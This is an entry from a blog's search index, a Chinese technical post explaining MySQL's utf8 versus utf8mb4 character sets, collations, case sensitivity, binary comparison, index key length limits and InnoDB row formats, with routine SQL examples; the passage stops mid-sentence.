<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MySQL中utf8和utf8mb4的使用以及字符集相关</title>
    <url>/2018/06/28/mysql-utf8-and-utf8mb4/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>以前一般在MySQL开发了，就实际上转向Oracle了，没留意一些东西，碰到了就回头过来看看。<br>有小伙伴在安装MySQL后设置编码为utf8，我们以前都是会直接设置utf8mb4，这背后又隐藏着什么？这一切的背后，究竟是人性的扭曲还是道德的沦丧？</p><p>其实只是因为<code>Unicode 委员会还做着 “65535 个字符足够全世界用了”的美梦。</code> <a href="https://my.oschina.net/xsh1208/blog/1052781">参考</a> 我比较喜欢这句。<br>也就是指的Unicode最初的<a href="https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%B9%B3%E9%9D%A2%E6%98%A0%E5%B0%84">基本多文本平面</a> (BMP)（U+0000至U+FFFF），BMP 已经包含了控制符、拉丁文，中、日、韩等绝大多数国际字符，但并不是所有，最常见的就算现在手机端常用的表情字符Emoji（Emoji 是一种特殊的 Unicode 编码，常见于 ios 和 android 手机上）一些不常用的汉字，如 “墅” ，这些需要四个字节才能编码出来。后来的补充字符(U+10000至U+10FFFF)，则将Unicode扩充到了(U+0000至U+10FFFF)。</p><blockquote><p>注：QQ里面的内置的表情不算，它是通过特殊映射到的一个gif图片。一般输入法自带的就是。</p></blockquote><p>MySQL在<strong>5.5.3</strong>之后(查看版本：select version();)增加了这个<code>utf8mb4</code>的编码，mb4就是<strong>most bytes 4</strong>的意思，支持的字节数最大为4，即专门用来兼容四字节的unicode。<br>而我们通常在MySQL中所说的<code>utf8</code>编码，其实就是指的 <strong>utf8mb3</strong> 。utf8mb4 是 utf8mb3 的超集并完全兼容utf8mb3，能够用四个字节存储更多的字符。</p><blockquote><p>utf8mb3：Unicode字符集的UTF-8编码，每个字符使用1到3个字节。<br>utf8mb4：Unicode字符集的UTF-8编码，每个字符使用1到4个字节。</p></blockquote><p>对于 CHAR 类型数据，utf8mb4 会多消耗一些空间，根据 Mysql 官方建议， <strong>使用 VARCHAR 替代 CHAR</strong> 以有效节省空间。</p><p>当你的数据库里要求能够存入这些表情或宽字符时，可以把字段定义为 <code>utf8mb4</code>，同时要注意连接字符集也要设置为<code>utf8mb4</code>，否则在 <a href="http://seanlook.com/2016/04/22/mysql-sql-mode-troubleshooting/">严格模式</a> 下会出现 <code>Incorrect string value: /xF0/xA1/x8B/xBE/xE5/xA2… for column &#39;name&#39;</code> 这样的错误，非严格模式下此后的数据会被截断。</p><p>建立数据库/表和进行数据库操作时尽量显式指出使用的字符集，而不是依赖于MySQL的默认设置，否则MySQL升级时可能带来很大困扰。</p><p><strong>如默认不区分大小写，可添加binary，强制进行按字节进行比较,以区分大小写。</strong> <code>如建表时未添加binary属性，可能影响索引失效</code> <a href="#binary相关">其他binary相关</a></p><p><strong>MySQL使用的UTF-8都没有BOM值。</strong><br><code>BOM(Byte Order Mark)，即文本开头为不可见的3个字节，EF BB BF</code></p><h1 id="utf8升级utf8mb4"><a href="#utf8升级utf8mb4" class="headerlink" title="utf8升级utf8mb4"></a><a href="#修改为utf8mb4示例">utf8升级utf8mb4</a></h1><p>如果你的表定义和连接字符集都是utf8，那么直接在你的表上执行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl_name <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4;</span><br></pre></td></tr></table></figure><p>则能够该表上所有的列的character类型变成 utf8mb4，表定义的默认字符集也会修改。</p><p>点击上面目录见修改数据库、表、字段实例，或<a href="#修改为utf8mb4示例">点这实例</a> 。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>使用utf8mb4之后，官方建议尽量用 varchar 代替 char。</li><li><code>SET NAMES utf8mb4;</code> 让连接的时候便可以插入四字节字符。（如果依然使用 utf8 连接，只要不出现四字节字符则完全没问题）。</li><li><code>SET character-set-server = utf8mb4;</code> 修改服务端 <code>character-set-server=utf8mb4</code>，Java驱动会自动检测服务端 <code>character_set_server</code> 的配置，如果为utf8mb4，驱动在建立连接的时候设置 <code>SET NAMES utf8mb4</code>。</li><li><code>SET character-set = utf8mb4;</code> 修改服务端c++, php, python 等语言的设置。</li><li>不能ONLINE，也就是执行之后全表禁止修改，有关这方面的讨论见 [mysql 5.6 原生Online DDL解析](<a href="http://seanlook.com/2016/05/24/mysql-online-ddl-">http://seanlook.com/2016/05/24/mysql-online-ddl-</a> concept/)；</li><li>它可能会自动该表字段类型定义，如 <a href="https://dev.mysql.com/doc/refman/8.0/en/alter-table.html">VARCHAR 被转成 MEDIUMTEXT</a>，可以通过 MODIFY 指定类型为原类型</li><li>不要随便执行<code>ALTER TABLE tbl_name DEFAULT CHARACTER SET utf8mb4</code>， <strong>特别是当表原本不是utf8时，除非表是空的或者你确认表里只有拉丁字符</strong> ，否则正常和乱的就混在一起了。</li><li><strong>最重要的是</strong> ，你连接时使用的latin1字符集写入了历史数据，表定义是latin1或utf8，不要期望通过 <code>ALTER ... CONVERT ...</code> 能够让你达到用utf8读取历史中文数据的目的，没卵用，老老实实做逻辑dump。</li><li>索引键超长问题。<code>Error 1071: Specified key was too long; max key length is 767 bytes</code>。当使用utf8mb4编码后，主键id的长度设置255，太长，只能设置小于191的。<a herf="#索引键超长">详解</a></li><li>join 查询时索引失效问题。索引失效发生在utf8mb4列 在条件左边。</li></ul><p><a href="http://seanlook.com/2016/10/23/mysql-utf8mb4/">摘自</a></p><p><a href="#SET NAMES utf8mb4 实际等同于SET"><code>SET NAMES utf8mb4;</code>实际等同于</a><br><a href="#MySQL字符集系统变量名简述">MySQL字符集系统变量名简述</a></p><p>其他</p><ul><li>my.cnf中的default_character_set设置只影响mysql命令连接服务器时的连接字符集，不会对使用libmysqlclient库的应用程序产生任何作用！</li><li>对字段进行的SQL函数操作通常都是以内部操作字符集进行的，不受连接字符集设置的影响。</li><li>SQL语句中的裸字符串会受到连接字符集或introducer设置的影响，对于比较之类的操作可能产生完全不同的结果，需要小心！</li></ul><h1 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h1><h2 id="列出可用的字符集"><a href="#列出可用的字符集" class="headerlink" title="列出可用的字符集"></a>列出可用的字符集</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span>;</span><br></pre></td></tr></table></figure><p>或是查询<code>INFORMATION_SCHEMA CHARACTER_SETS表</code></p><p>列出常见字符集</p><table><thead><tr><th>Charset</th><th>Description</th><th>Default collation</th><th>Maxlen</th></tr></thead><tbody><tr><td>gb18030</td><td></td><td>gb18030_chinese_ci</td><td>4</td></tr><tr><td>gb2312</td><td></td><td>gb2312_chinese_ci</td><td>2</td></tr><tr><td>gbk</td><td></td><td>gbk_chinese_ci</td><td>2</td></tr><tr><td>utf16</td><td>UTF-16 Unicode</td><td>utf16_general_ci</td><td>4</td></tr><tr><td>utf16le</td><td>UTF-16LE Unicode</td><td>utf16le_general_ci</td><td>4</td></tr><tr><td>utf32</td><td>UTF-32 Unicode</td><td>utf32_general_ci</td><td>4</td></tr><tr><td>utf8</td><td></td><td>utf8_general_ci</td><td>3</td></tr><tr><td>utf8mb4</td><td>UTF-8 Unicode</td><td>utf8mb4_0900_ai_ci</td><td>4</td></tr></tbody></table><p>是的，没写错，utf8已经不好意思在描述里自称<code>UTF-8 Unicode</code>了</p><h2 id="列出字符集的排序规则-校对集-以及规则解释"><a href="#列出字符集的排序规则-校对集-以及规则解释" class="headerlink" title="列出字符集的排序规则(校对集)以及规则解释"></a>列出字符集的排序规则(校对集)以及规则解释</h2><p>给定的字符集总是至少有一个排序规则，并且大多数字符集都有几个排序规则。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLLATION</span> <span class="keyword">WHERE</span> <span class="keyword">Charset</span> = <span class="string">'utf8mb4'</span>;</span><br></pre></td></tr></table></figure><p>或查询<code>INFORMATION_SCHEMA COLLATIONS表</code></p><p>utf8 的默认排序规则为<code>utf8_general_ci</code></p><p>列出<code>utf8mb4</code>的常见排序规则，默认为<code>utf8mb4_0900_ai_ci</code> ，即是UCA 9.0.0版本的Unicode，口音不敏感，不区分大小写 。</p><table><thead><tr><th>Collation</th><th>Charset</th><th>Id</th><th>Default</th><th>Compiled</th><th>Sortlen</th><th>Pad_attribute</th></tr></thead><tbody><tr><td>utf8mb4_0900_ai_ci</td><td>utf8mb4</td><td>255</td><td>Yes</td><td>Yes</td><td>0</td><td>NO PAD</td></tr><tr><td>utf8mb4_general_ci</td><td>utf8mb4</td><td>45</td><td></td><td>Yes</td><td>1</td><td>PAD SPACE</td></tr><tr><td>utf8mb4_unicode_520_ci</td><td>utf8mb4</td><td>246</td><td></td><td>Yes</td><td>8</td><td>PAD SPACE</td></tr><tr><td>utf8mb4_unicode_ci</td><td>utf8mb4</td><td>224</td><td></td><td>Yes</td><td>8</td><td>PAD SPACE</td></tr></tbody></table><h3 id="Pad-attribute-MySQL比较字符串时尾部空格是否忽略"><a href="#Pad-attribute-MySQL比较字符串时尾部空格是否忽略" class="headerlink" title="Pad_attribute:MySQL比较字符串时尾部空格是否忽略"></a>Pad_attribute:MySQL比较字符串时尾部空格是否忽略</h3><p><code>NO PAD</code> 排序规则将字符串末尾的空格处理为任何其他字符。<br><code>PAD SPACE</code>排序，尾部空格在比较中无关紧要; 比较字符串而不考虑任何尾随空格。</p><p>即是<code>PAD SPACE</code>会出现以下情况，MySQL比较字符串时会忽略尾部空格。包括其他推荐的<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_general_ci</code>以及所有utf8,，这算是一个小坑，注意不要跳进来了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;a &#39; &#x3D; &#39;a&#39;;</span><br><span class="line">+------------+</span><br><span class="line">| &#39;a &#39; &#x3D; &#39;a&#39; |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>所以，<strong>使用<code>utf8mb4_unicode_ci</code>和<code>utf8mb4_general_ci</code>时，一定要做好去空格trim操作。</strong></p><p><code>utf8mb4_general_ci</code> 在比较和排序的时候更快。<br><code>utf8mb4_unicode_ci</code> 是基于标准的Unicode来排序和比较，能够在各种语言之间精确排序。比如Unicode把<code>ß</code>、<code>Œ</code>当成<code>ss</code>和<code>OE</code>来看；而general会把它们当成<code>s</code>、<code>e</code>，再如<code>ÀÁÅåāă</code>各自都与 <code>A</code> 相等。</p><h3 id="MySQL字符串比较时，-ci不区分，-cs-bin区分大小写"><a href="#MySQL字符串比较时，-ci不区分，-cs-bin区分大小写" class="headerlink" title="MySQL字符串比较时，_ci不区分，_cs/_bin区分大小写"></a>MySQL字符串比较时，_ci不区分，_cs/_bin区分大小写</h3><p>安装时如果文件系统区分，如Linux，则<code>lower_case_table_names</code>参数为0，即区分大小写。<br>如果文件系统不区分，如Windows或MacOS上，即不区分大小写。<br>在Windows上，默认值为1.在macOS上，默认值为2。</p><table><thead><tr><th>OS</th><th>lower_case_table_names</th><th>是否区分大小写</th><th>存储数据库、表、表别名</th></tr></thead><tbody><tr><td>Linux、Unix</td><td>0</td><td>区分大小写</td><td>表名将按指定存储</td></tr><tr><td>Windows</td><td>1</td><td>不区分大小写</td><td>表名将以小写形式存储在磁盘上</td></tr><tr><td>MacOS</td><td>2</td><td>不区分大小写</td><td>表名按照给定值存储，但以小写形式比较</td></tr></tbody></table><p><strong>MyISAM 引擎不支持–lower_case_table_names=0在不区分大小写的文件系统上启动服务器</strong><br><strong>InnoDB 引擎，则应在所有平台上将此变量设置为1以强制名称转换为小写字母。</strong></p><table><thead><tr><th>后缀</th><th>含义</th></tr></thead><tbody><tr><td>_ai</td><td>口音不敏感</td></tr><tr><td>_as</td><td>口音敏感</td></tr><tr><td>_ci</td><td>不区分大小写</td></tr><tr><td>_cs</td><td>区分大小写</td></tr><tr><td>_ks</td><td>假名敏感</td></tr><tr><td>_bin</td><td>二进制,区分大小写</td></tr></tbody></table><h3 id="Unicode排序算法-UCA-版本"><a href="#Unicode排序算法-UCA-版本" class="headerlink" title="Unicode排序算法(UCA)版本"></a>Unicode排序算法(UCA)版本</h3><p>对于Unicode字符集，排序规则名称可能包含一个版本号，以指示排序规则基于的Unicode排序算法（UCA）的版本。</p><ul><li><p>utf8mb4_0900_ai_ci基于<a href="http://www.unicode.org/Public/UCA/9.0.0/allkeys.txt">UCA 9.0.0</a>。</p></li><li><p>utf8mb4_unicode_520_ci基于<a href="http://www.unicode.org/Public/UCA/5.2.0/allkeys.txt">UCA 5.2.0</a>。</p></li><li><p>utf8mb4_unicode_ci（没有版本命名）基于<a href="http://www.unicode.org/Public/UCA/4.0.0/allkeys-4.0.0.txt">UCA 4.0.0</a>。</p></li></ul><h2 id="INFORMATION-SCHEMA-中的大小写敏感"><a href="#INFORMATION-SCHEMA-中的大小写敏感" class="headerlink" title="INFORMATION_SCHEMA 中的大小写敏感"></a>INFORMATION_SCHEMA 中的大小写敏感</h2><p>INFORMATION_SCHEMA表格中的 字符串列具有utf8_general_ci大小写不敏感的排序规则。当前在Linux上，<code>lower_case_table_names</code>为0，即区分大小写。<br>查询在SCHEMATA.SCHEMA_NAME列中 搜索 mysql数据库，和MYSQL 数据库，结果将不同。</p><p>想使用MYSQL查询出mysql</p><ol><li>查询时COLLATE指定排序规则</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME COLLATE utf8_general_ci &#x3D; &#39;MYSQL&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| SCHEMA_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><ol start="2"><li>使用UPPER或LOWER</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE UPPER(SCHEMA_NAME) &#x3D; &#39;MYSQL&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| SCHEMA_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>查询INFORMATION_SCHEMA中搜索自身时，将匹配<code>utf8_general_ci</code>规则。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SCHEMA_NAME</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">WHERE</span> <span class="built_in">SCHEMA_NAME</span> = <span class="string">'INFORMATION_SCHEMA'</span>;</span><br></pre></td></tr></table></figure><h2 id="binary相关"><a href="#binary相关" class="headerlink" title="binary相关"></a>binary相关</h2><p><strong>binary不同于_bin</strong></p><p><strong>LOWER() 和 UPPER() 对于二进制字符串是无效的(包括 BINARY, VARBINARY, BLOB)</strong><br><code>SELECT LOWER(&#39;aA&#39;), UPPER(&#39;zZ&#39;);</code><br>不适用于<br><code>SET NAMES binary;</code><br>必须将字符串转换为非二进制字符串<br><code>SELECT LOWER(&#39;aA&#39;), LOWER(CONVERT(&#39;aA&#39; USING latin1));</code></p><p>binary 可将 string 转换为二进制 string。BINARY str 其实是 CAST(str AS BINARY) 的缩写。<br>所以，对于CHAR、VARCHAR和TEXT类型，BINARY属性可以为列分配该列字符集的 校对规则。即<br><strong>如默认不区分大小写，可添加binary，强制进行按字节进行比较,以区分大小写。</strong> <code>如建表时未添加binary属性，可能影响索引失效</code><br>这是我们通常在暂无能为力更改现有结构下的常规做法。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> some_table <span class="keyword">where</span> <span class="built_in">binary</span> <span class="keyword">str</span>=<span class="string">'abc'</span>;</span><br></pre></td></tr></table></figure><p>我们可在建表建字段时，可在区分大小写的字段上添加binary属性。</p><p>对于二进制字符串，所有字符在比较中都很重要，包括尾随空格。</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">SET NAMES binary;</span><br><span class="line">SELECT <span class="emphasis">'a '</span> = <span class="emphasis">'a'</span>;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| <span class="emphasis">'a '</span> = <span class="emphasis">'a'</span> |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|          0 |</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure><p>因为binary会按字节，区分大小写，结尾使用<code>\0</code>填充到全部位数。<br>搜索时也是使用全部匹配，填充<code>\0</code>到位</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">CREATE TABLE t1 (</span><br><span class="line"><span class="code">         a CHAR(10) CHARACTER SET utf8 COLLATE utf8_bin,</span></span><br><span class="line"><span class="code">         b BINARY(10)</span></span><br><span class="line"><span class="code">       );</span></span><br><span class="line">INSERT INTO t1 VALUES (<span class="emphasis">'a'</span>,<span class="emphasis">'a'</span>);</span><br><span class="line">SELECT HEX(a), HEX(b),b = <span class="emphasis">'a'</span>,b = <span class="emphasis">'a\0\0\0\0\0\0\0\0\0'</span> FROM t1;</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br><span class="line">| HEX(a) | HEX(b)               | b = <span class="emphasis">'a'</span> | b = <span class="emphasis">'a\0\0\0\0\0\0\0\0\0'</span> |</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br><span class="line">| 61     | 61000000000000000000 |       0 |                         1 |</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br></pre></td></tr></table></figure><p>b 已不等于’a’<br>所以，有时候, 如果将索引列转换为 BINARY, MySQL可能不会使用索引。</p><p>varbinary保存变长的字符串，后面不会补\0</p><h2 id="查看服务器正使用的连接的字符集和排序规则"><a href="#查看服务器正使用的连接的字符集和排序规则" class="headerlink" title="查看服务器正使用的连接的字符集和排序规则"></a>查看服务器正使用的连接的字符集和排序规则</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'character_set%'</span>;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'collation%'</span>;</span><br></pre></td></tr></table></figure><h3 id="MySQL字符集系统变量名简述"><a href="#MySQL字符集系统变量名简述" class="headerlink" title="MySQL字符集系统变量名简述"></a>MySQL字符集系统变量名简述</h3><table><thead><tr><th align="left">系统变量名</th><th align="left">简述</th></tr></thead><tbody><tr><td align="left">character_set_system</td><td align="left">元数据Metadata使用，即USER(), CURRENT_USER(), SESSION_USER(), SYSTEM_USER(), DATABASE(), and VERSION() 等functions</td></tr><tr><td align="left">character_set_server、collation_server</td><td align="left">服务器对应的内部操作使用</td></tr><tr><td align="left">character_set_database、collation_database</td><td align="left">当前选中数据库的默认</td></tr><tr><td align="left">character_set_client</td><td align="left">客户端来源数据</td></tr><tr><td align="left">character_set_connection、collation_connection</td><td align="left">服务器在接收时</td></tr><tr><td align="left">character_set_results</td><td align="left">服务器查询结果集返回到客户端</td></tr></tbody></table><p>另外，<a href="#查询字符串时，显示指定字符集">查询时指定字符集</a></p><h2 id="SET-NAMES-utf8mb4-实际等同于"><a href="#SET-NAMES-utf8mb4-实际等同于" class="headerlink" title="SET NAMES utf8mb4 实际等同于"></a>SET NAMES utf8mb4 实际等同于</h2><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES <span class="comment">utf8mb4</span>;</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_client <span class="comment">= utf8mb4</span>;</span><br><span class="line"><span class="keyword">SET</span> character_set_results <span class="comment">= utf8mb4</span>;</span><br><span class="line"><span class="keyword">SET</span> character_set_connection <span class="comment">= utf8mb4</span>;</span><br></pre></td></tr></table></figure><h3 id="MySQL中的字符集转换过程"><a href="#MySQL中的字符集转换过程" class="headerlink" title="MySQL中的字符集转换过程"></a>MySQL中的字符集转换过程</h3><ol><li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</p></li><li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><ul><li><p>使用每个数据字段的CHARACTER SET设定值；</p></li><li><p>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</p></li><li><p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p></li><li><p>若上述值不存在，则使用character_set_server设定值。</p></li></ul></li><li><p>将操作结果从内部操作字符集转换为character_set_results。</p></li></ol><h2 id="查看指定数据库db-name的字符集和排序规则"><a href="#查看指定数据库db-name的字符集和排序规则" class="headerlink" title="查看指定数据库db_name的字符集和排序规则"></a>查看指定数据库db_name的字符集和排序规则</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">WHERE</span> <span class="built_in">SCHEMA_NAME</span> = <span class="string">'db_name'</span>;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USE</span> db_name;</span><br><span class="line"><span class="built_in">SELECT</span> <span class="comment">@@</span>character_set_database, <span class="comment">@@</span>collation_database;</span><br></pre></td></tr></table></figure><h2 id="查询字符串时，显示指定字符集"><a href="#查询字符串时，显示指定字符集" class="headerlink" title="查询字符串时，显示指定字符集"></a>查询字符串时，显示指定字符集</h2><p>语法：</p><figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">[<span class="name">_charset_name</span>]<span class="symbol">'string</span>' [<span class="name">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'abc'</span> <span class="keyword">COLLATE</span> utf8_danish_ci;</span><br></pre></td></tr></table></figure><h2 id="创建和修改库、表、列的字符集和排序规则"><a href="#创建和修改库、表、列的字符集和排序规则" class="headerlink" title="创建和修改库、表、列的字符集和排序规则"></a>创建和修改库、表、列的字符集和排序规则</h2><h3 id="创建和修改数据库db-name时，都可指定"><a href="#创建和修改数据库db-name时，都可指定" class="headerlink" title="创建和修改数据库db_name时，都可指定"></a>创建和修改数据库db_name时，都可指定</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> db_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> collation_name]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> db_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="创建和修改指定表tbl-name的字符集和排序规则"><a href="#创建和修改指定表tbl-name的字符集和排序规则" class="headerlink" title="创建和修改指定表tbl_name的字符集和排序规则"></a>创建和修改指定表tbl_name的字符集和排序规则</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl_name (column_list)</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="创建和修改表指定列col-name的字符集和排序规则"><a href="#创建和修改表指定列col-name的字符集和排序规则" class="headerlink" title="创建和修改表指定列col_name的字符集和排序规则"></a>创建和修改表指定列col_name的字符集和排序规则</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">col_name &#123;<span class="type">CHAR</span> | <span class="type">VARCHAR</span> | <span class="type">TEXT</span>&#125; (col_length)</span><br><span class="line">    [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><p>also be used for ENUM and SET columns:</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">col_name &#123;ENUM | <span class="keyword">SET</span>&#125; (val_list)</span><br><span class="line">    [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="修改为utf8mb4示例"><a href="#修改为utf8mb4示例" class="headerlink" title="修改为utf8mb4示例"></a>修改为utf8mb4示例</h3><p>依次修改数据库，表，表字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改数据库:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> database_name <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4 <span class="keyword">COLLATE</span> = utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 修改表:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 修改表字段:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> column_name column_name <span class="built_in">VARCHAR</span>(<span class="number">191</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br></pre></td></tr></table></figure><h2 id="索引键超长"><a href="#索引键超长" class="headerlink" title="索引键超长"></a>索引键超长</h2><p>InnoDB中使用 <strong>COMPACT</strong> 或 <strong>REDUNDANT</strong> 格式的表的单个索引的最大长度为767字节，因此对于utf8mb3或utf8mb4的列，可以分别索引最多255或191个字符。<br>字段定义的是能存储的字符数，比如 VARCHAR(200) 代表能够存200个汉字，索引定义是字符集类型最大长度算的，即 utf8 maxbytes=3, utf8mb4 maxbytes=4，算下来utf8和utf8mb4两种情况的索引长度分别为600 bytes和800bytes，后者超过了768，导致出错<code>Error 1071: Specified key was too long; max key length is 767 bytes。</code> 。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">col1 <span class="type">VARCHAR</span>(<span class="number">500</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8, <span class="keyword">INDEX</span> (col1(<span class="number">255</span>))</span><br><span class="line">col1 <span class="type">VARCHAR</span>(<span class="number">500</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4, <span class="keyword">INDEX</span> (col1(<span class="number">191</span>))</span><br></pre></td></tr></table></figure><ul><li>InnoDB中 <strong>COMPRESSED</strong> 或 <strong>DYNAMIC</strong> 最多3072字节，所以分别为最多1024或768个字符utf8mb3或 utf8mb4列。但也依然不建议索引太长，太浪费空间和cpu搜索资源。</li></ul><p>如果已有定义超过这个长度的，可加上前缀索引，如果暂不能加上前缀索引（像唯一索引），可把该字段的字符集改回utf8或latin1。<br>但是，（ <strong>敲黑板啦，很重要</strong> ），要防止出现 <code>Illegal mix of collations (utf8_general_ci,IMPLICIT) and (utf8mb4_general_ci,COERCIBLE) for operation &#39;=&#39;</code> 错误：连接字符集使用utf8mb4，但 SELECT/UPDATE where条件有utf8类型的列，且条件右边存在不属于utf8字符，就会触发该异常。表示踩过这个坑。</p><p>再多加一个友好提示：EXPLAIN 结果里面的 key_len 指的搜索索引长度，单位是bytes，而且是以字符集支持的单字符最大字节数算的，这也是为什么 INDEX_LENGTH 膨胀厉害的一个原因。</p><h2 id="InnoDB默认表的行格式"><a href="#InnoDB默认表的行格式" class="headerlink" title="InnoDB默认表的行格式"></a>InnoDB默认表的行格式</h2><p>在MySQL 5.0.3之前，<strong>REDUNDANT</strong> 是InnoDB唯一可用的行格式。<br>从MySQL 5.0.3到MySQL 5.7.8的默认行格式，为 <strong>compact</strong> 数据格式。<br>从MySQL 5.7.9开始，默认行格式由 <strong>innodb_default_row_format</strong> 配置选项定义， 默认设置为 <strong>DYNAMIC</strong> 。</p><p>更改系统表空间默认行格式DYNAMIC， COMPACT，和REDUNDANT。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">SET</span> GLOBAL <span class="attribute">innodb_default_row_format</span>=DYNAMIC;</span><br></pre></td></tr></table></figure><p>COMPRESSED 只能在CREATE TABLE或 ALTER 